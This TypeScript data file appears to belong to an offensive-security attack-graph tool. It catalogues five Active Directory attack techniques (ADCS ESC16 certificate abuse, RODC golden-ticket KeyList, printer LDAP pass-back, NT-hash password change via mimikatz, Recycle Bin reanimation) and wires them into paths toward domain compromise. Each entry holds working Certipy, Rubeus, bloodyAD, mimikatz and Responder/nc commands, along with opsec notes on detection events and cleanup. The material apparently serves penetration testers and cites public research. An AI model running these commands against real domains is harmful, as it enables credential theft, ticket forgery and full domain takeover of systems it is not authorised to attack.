import type { AttackEdge, TechniqueNodeDef } from '../schema';
import { mitre, r } from '../lib';

/**
 * Techniques surfaced from real-world engagement experience that the
 * other audits missed. Each is web-verified with public references (never the
 * source notes) and wired forward so none dead-ends.
 */
export const adBoxesNodes: TechniqueNodeDef[] = [
  {
    id: 'adcs-esc16',
    label: 'ADCS ESC16 (CA Security Extension Disabled)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'SID security extension disabled CA-wide → a cert maps to a victim by UPN alone: set your account UPN to a target, enroll, authenticate as them.',
    description:
      "ESC16 is a CA-wide state where szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2) is on the CA's DisableExtensionList, so every issued certificate carries no SID and the DC can only map it to an account by UPN. Like ESC9, an attacker who can write the userPrincipalName of an account they control sets it to a privileged target (e.g. administrator), enrolls an ordinary client-auth cert, reverts the UPN, then authenticates via PKINIT: the DC maps the cert to the target by UPN and returns its TGT / NT hash. This UPN swap only works while the DCs run StrongCertificateBindingEnforcement mode 0 (disabled) or 1 (compatibility), where they fall back to weak UPN mapping for a cert with no SID extension. A mode 2 (Full Enforcement) DC denies auth for any cert lacking the SID extension, so ESC16 does not bypass it; note KB5014754 moves unconfigured DCs to mode 2 by Feb 2025 and removes the compatibility fallback by Sept 2025. This is NOT the ESC1 'arbitrary SAN' trick: the default User template forbids requester-supplied subjects, so the bypass is the implicit UPN mapping. Setting the CA flag needs ManageCA (often reached via ESC7).",
    tools: [
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
      { name: 'certutil (Microsoft)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil' },
    ],
    commands: [
      { label: 'Set the CA state (needs ManageCA), then restart the CA', code: r`certutil -config "DC01.corp.local\CORP-CA" -setreg policy\DisableExtensionList +1.3.6.1.4.1.311.25.2
net stop certsvc && net start certsvc`, lang: 'cmd' },
      { label: "Point a controlled account's UPN at the target", code: r`certipy-ad account -u svc_infra -p 'PASS' -dc-ip 10.0.0.1 -user svc_infra -upn administrator update`, lang: 'bash' },
      { label: 'Enroll an ordinary client-auth cert as that account, then revert the UPN', code: r`certipy-ad req -u svc_infra -p 'PASS' -dc-ip 10.0.0.1 -target DC01.corp.local -ca CORP-CA -template User
certipy-ad account -u svc_infra -p 'PASS' -dc-ip 10.0.0.1 -user svc_infra -upn svc_infra@corp.local update`, lang: 'bash' },
      { label: 'Authenticate as the target via PKINIT → TGT + NT hash', code: r`certipy-ad auth -pfx administrator.pfx -username administrator -domain corp.local -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackingArticles, ADCS ESC16 (Security Extension Disabled Globally)', url: 'https://www.hackingarticles.in/adcs-esc16-security-extension-disabled-on-ca-globally/' },
      { label: 'Certipy Wiki, Privilege Escalation (ESC1-ESC16)', url: 'https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation' },
      { label: 'SpecterOps Certify Wiki, ESC16 (Security Extension Disabled)', url: 'https://docs.specterops.io/ghostpack-docs/Certify.wik-mdx/esc16-security-extension-disabled-on-certificate-authority' },
      { label: 'Schroeder & Christensen (SpecterOps), Certificates and Pwnage and Patches, Oh My!', url: 'https://specterops.io/blog/2022/11/09/certificates-and-pwnage-and-patches-oh-my/' },
      { label: 'Microsoft, KB5014754: Certificate-based authentication changes on Windows domain controllers (the enforcement modes + timeline)', url: 'https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16' },
    ],
    requires: ['ManageCA on the CA to set DisableExtensionList (or the CA already in that state)', 'Write access to userPrincipalName on an account you control'],
    opsec: 'Toggling DisableExtensionList restarts the CA service (logged) and affects ALL future certificates issued by this CA; the UPN edits and the cert request + PKINIT auth raise 5136/4886/4887/4768. Revert the UPN and the CA flag after use.',
  },
  {
    id: 'rodc-keylist-abuse',
    label: 'RODC Abuse (Golden Ticket + KeyList)',
    phase: 'domain-dominance',
    needs: 'local-admin',
    summary: "From SYSTEM on a Read-Only DC: dump krbtgt_<N>, allow a target in the Password Replication Policy, forge an RODC golden ticket, then KeyList-request a writable DC for the target's real keys.",
    description:
      "A Read-Only DC holds its own krbtgt account (krbtgt_<N>, N = the number in its msDS-KrbTgtLink). With admin/SYSTEM on the RODC, dump the krbtgt_<N> AES/RC4 key. Because an RODC only caches accounts allowed by its Password Replication Policy, the target must be in msDS-RevealOnDemandGroup and NOT in msDS-NeverRevealGroup (directly or via nested groups). The built-in Administrator is nested in Domain Admins, which is default-denied, so either KeyList a non-privileged target that is not denied, or surgically remove only that entry from NeverRevealGroup rather than clearing the whole attribute. Forge an RODC golden ticket with Rubeus golden /rodcNumber:<N>, then send it to a WRITABLE DC in a TGS-REQ carrying a KERB-KEY-LIST-REQ (Rubeus asktgs /keyList): the writable DC returns the target's real long-term key for the requested enctype (NT/RC4 hash if /enctype:rc4, AES key if /enctype:aes256), turning RODC-local SYSTEM into full domain compromise.",
    tools: [
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'Impacket (ticketer / secretsdump)', url: 'https://github.com/fortra/impacket' },
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      { label: 'Read the current allow-list first so you can restore it', code: r`bloodyAD --host dc01.corp.local -d corp.local -u user -p PASS get object 'RODC01$' --attr msDS-RevealOnDemandGroup`, lang: 'bash' },
      { label: 'Allow the target to be cached by the RODC (set object REPLACES the attribute, so pass every existing value plus the new one)', code: r`bloodyAD --host dc01.corp.local -d corp.local -u user -p PASS set object 'RODC01$' msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=corp,DC=local' -v 'CN=Administrator,CN=Users,DC=corp,DC=local'`, lang: 'bash' },
      { label: 'Forge an RODC golden ticket with rodcNumber', code: r`Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /aes256:<krbtgt_N_AES> /user:Administrator /id:500 /domain:corp.local /sid:<DOMAIN_SID> /nowrap`, lang: 'powershell' },
      { label: 'KeyList request to a writable DC to recover real keys', code: r`Rubeus.exe asktgs /enctype:aes256 /keyList /ticket:<BASE64_RODC_GT> /service:krbtgt/corp.local /nowrap`, lang: 'powershell' },
    ],
    mitre: mitre('T1558.001'),
    references: [
      { label: 'Elad Shamir, At the Edge of Tier Zero: The Curious Case of the RODC', url: 'https://shenaniganslabs.io/2023/01/25/RODCs.html' },
      { label: 'The Hacker Recipes, RODC Golden Tickets / KeyList', url: 'https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/rodc-golden-tickets' },
      { label: 'InternalAllTheThings, RODC abuse', url: 'https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-rodc/' },
      { label: 'GhostPack/Rubeus, Kerberos Key-List-Request (PR #147)', url: 'https://github.com/GhostPack/Rubeus/pull/147' },
    ],
    requires: ['Admin / SYSTEM on a Read-Only DC (e.g. via RBCD or WriteAccountRestrictions on the RODC object)', 'A writable DC to answer the KeyList request'],
    opsec: 'Editing msDS-RevealOnDemandGroup / NeverRevealGroup on a DC object is a high-signal directory change. bloodyAD set object REPLACES the whole attribute, so it clobbers the RODC real PRP allow-list (usually Allowed RODC Password Replication Group); capture the original values first and restore them exactly on cleanup, not just remove your entry. The KeyList TGS-REQ to the writable DC is unusual traffic; prefer AES over RC4 to reduce ticket anomalies.',
  },
  {
    id: 'passback-attack',
    label: 'Pass-Back Attack (LDAP/Printer Creds)',
    phase: 'credential-access',
    needs: 'none',
    summary: 'Reconfigure a printer/MFP or app to authenticate to your rogue server, then hit "test connection" so it discloses its stored service credentials in cleartext.',
    description:
      "Devices and apps that store service credentials for LDAP/SMTP/SMB (printers, MFPs, scanners, web-app config panels) usually expose a 'Test Connection' that binds using the stored secret. Point the configured server host at an attacker-controlled listener and trigger the test: the device sends its credentials to you. For a simple/unencrypted LDAP bind this yields the password in CLEARTEXT (caught with Responder or a rogue LDAP/netcat listener): no cracking or NetNTLM relay needed, because the device decrypts and transmits the secret itself. Distinct from relay/coercion, which capture a challenge-response rather than cleartext.",
    tools: [
      { name: 'Responder', url: 'https://github.com/lgandx/Responder' },
      { name: 'Ncat', url: 'https://nmap.org/ncat/' },
    ],
    commands: [
      { label: 'Capture the cleartext LDAP simple-bind (rogue LDAP server)', code: r`sudo responder -I eth0 -v`, lang: 'bash' },
      { label: 'Minimal rogue listener to catch the bind', code: r`nc -lvnp 389`, lang: 'bash' },
      { label: 'Validate the captured creds against the DC', code: r`nxc smb dc01.corp.local -u svc_infra -p '<captured_cleartext>'`, lang: 'bash' },
    ],
    mitre: mitre('T1187'),
    references: [
      { label: 'R3d Buck3T, Pwning Printers with LDAP Pass-Back', url: 'https://medium.com/r3d-buck3t/pwning-printers-with-ldap-pass-back-attack-a0d8fa495210' },
      { label: 'boschko.ca, Pass-Back: Default Printer Creds to Domain Admin', url: 'https://boschko.ca/printer-to-domain-admin/' },
      { label: 'Rapid7, Xerox VersaLink MFP Pass-Back Vulnerabilities', url: 'https://www.rapid7.com/blog/post/2025/02/14/xerox-versalink-c7025-multifunction-printer-pass-back-attack-vulnerabilities-fixed/' },
    ],
    requires: ['Admin access to the device/app config panel (default creds often suffice)', 'A rogue LDAP/SMTP listener (Responder / netcat)'],
    opsec: 'Changing the configured server breaks the legitimate service until reverted; an unexpected outbound LDAP/SMTP connection to an attacker IP may alert NDR. Restore the original config after capture.',
  },
  {
    id: 'set-ntlm-hash',
    label: 'Set Password via NT Hash (changentlm)',
    phase: 'credential-access',
    needs: 'creds',
    summary: "Given a target's current NT hash (but not its cleartext), set its password to a known value over NTLM, enabling a password-based logon a PtH session can't do.",
    description:
      "When you hold an account's NT hash but need an actual password (e.g. for a password-based interactive/service logon that restores privileges a pass-the-hash token lacks), mimikatz lsadump::changentlm or impacket changepasswd can set a new password. changentlm authenticates with the OLD NT hash and sets a new password without ever knowing the cleartext. This is a credential-manipulation primitive distinct from the DACL-based force-change edge, which relies on a granted reset right rather than knowledge of the current hash.",
    tools: [
      { name: 'mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
      { name: 'Impacket (changepasswd.py)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Change password using the known OLD NT hash', code: r`lsadump::changentlm /server:dc01.corp.local /user:svc_sql /oldntlm:<OLD_NT_HASH> /newpassword:P@ss1234`, lang: 'text' },
      { label: 'Remote equivalent over the wire (hash auth)', code: r`impacket-changepasswd 'corp.local/svc_sql@dc01' -newpass 'P@ss1234' -hashes :<OLD_NT_HASH>`, lang: 'bash' },
    ],
    mitre: mitre('T1098'),
    references: [
      { label: 'gentilkiwi, mimikatz (Benjamin Delpy)', url: 'https://github.com/gentilkiwi/mimikatz' },
      { label: 'The Hacker Tools, mimikatz lsadump::changentlm', url: 'https://tools.thehacker.recipes/mimikatz/modules/lsadump/changentlm' },
      { label: 'Impacket, changepasswd.py', url: 'https://github.com/fortra/impacket/blob/master/examples/changepasswd.py' },
    ],
    requires: ["The target account's current NT hash", 'A DC that accepts the NTLM password change'],
    opsec: 'Changing a service account password may break the legitimate service and raises a self-change event (4723); it does NOT raise 4724, the event a force-reset (DACL abuse) would raise. The domain Minimum Password Age policy (default 1 day, but configurable and possibly 0) can block a second change within the window; a privileged reset bypasses it. Note the original hash to revert.',
  },
  {
    id: 'ad-recycle-bin-reanimation',
    label: 'AD Recycle Bin Reanimation',
    phase: 'enumeration',
    needs: 'domain-user',
    summary: 'Mine the AD Recycle Bin for secrets, or restore a deleted privileged object to regain its SID, group memberships and ACL edges.',
    description:
      "With the AD Recycle Bin enabled, deleted objects are retained with all attributes intact. Anyone who can read deleted objects (Get-ADObject -IncludeDeletedObjects) can mine them for secrets (cleartext in description/info, key material) or, with restore rights, reanimate a deleted account via Restore-ADObject: the restored account instantly regains its original SID, group memberships, delegations and ACL edges, which can re-open a privilege-escalation path.",
    tools: [
      { name: 'ActiveDirectory PowerShell (RSAT)', url: 'https://learn.microsoft.com/en-us/powershell/module/activedirectory/' },
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 set restore <deletedDN>', lang: 'bash' },
      { label: 'Enumerate deleted user objects', code: r`Get-ADObject -Filter 'isDeleted -eq $true -and ObjectClass -eq "user"' -IncludeDeletedObjects -Properties *`, lang: 'powershell' },
      { label: 'Restore a deleted object (regains SID + memberships)', code: r`Restore-ADObject -Identity (Get-ADObject -Filter {sAMAccountName -eq 'Todd.Wolfe'} -IncludeDeletedObjects).ObjectGUID`, lang: 'powershell' },
    ],
    mitre: mitre('T1098'),
    references: [
      { label: 'CravateRouge, Privilege Escalations from the AD Recycle Bin', url: 'https://cravaterouge.com/articles/ad-bin/' },
      { label: 'Microsoft Learn, Active Directory Recycle Bin', url: 'https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin' },
    ],
    requires: ['Read access to deleted objects (and restore rights to reanimate)', 'AD Recycle Bin enabled'],
    opsec: "Restore operations are logged (5138 'directory service object undeleted', plus 5136 for the accompanying attribute writes) and may surface a previously-deleted, possibly-monitored account; those events need the Audit Directory Service Changes subcategory plus a SACL on the target container, which is often not enabled. Prefer read-only attribute mining where the goal is only secret recovery.",
  },
];

export const adBoxesEdges: AttackEdge[] = [
  // ESC16 → ADCS category; forge cert → PKINIT / DCSync
  { source: 'adcs-esc16', target: 'pass-the-certificate', label: 'PKINIT as target' },
  // RODC abuse → DC Credential Dumping; reached via RBCD on the RODC
  { source: 'ad-cat-dc-dump', target: 'rodc-keylist-abuse' },
  { source: 'rbcd', target: 'rodc-keylist-abuse', label: 'admin on the RODC' },
  { source: 'rodc-keylist-abuse', target: 'dcsync' },
  { source: 'rodc-keylist-abuse', target: 'golden-ticket' },
  // Pass-back → Credential Access; cleartext creds → enumerate
  { source: 'passback-attack', target: 'valid-domain-creds', label: 'cleartext creds' },
  // changentlm → Credential Access; needs the NT hash, yields a usable password
  { source: 'ad-cat-credaccess', target: 'set-ntlm-hash' },
  { source: 'pass-the-hash', target: 'set-ntlm-hash', label: 'have the NT hash' },
  { source: 'set-ntlm-hash', target: 'lateral-movement-cme', label: 'password logon' },
  // Recycle bin → Enumeration; restored edges / archived secrets
  { source: 'ad-cat-enum', target: 'ad-recycle-bin-reanimation', description: 'Indicators this path applies: Get-ADObject -includeDeletedObjects returns objects with isDeleted=$true; Get-ADOptionalFeature \'Recycle Bin Feature\' reports EnabledScopes is non-empty; unresolvable SID / RID (e.g. RID 1111) that does not map to a live principal on the host.' },
  { source: 'ad-recycle-bin-reanimation', target: 'find-privesc-path', label: 'restored SID/edges' },
  { source: 'ad-recycle-bin-reanimation', target: 'valid-domain-creds', label: 'cleartext in attributes' },
];
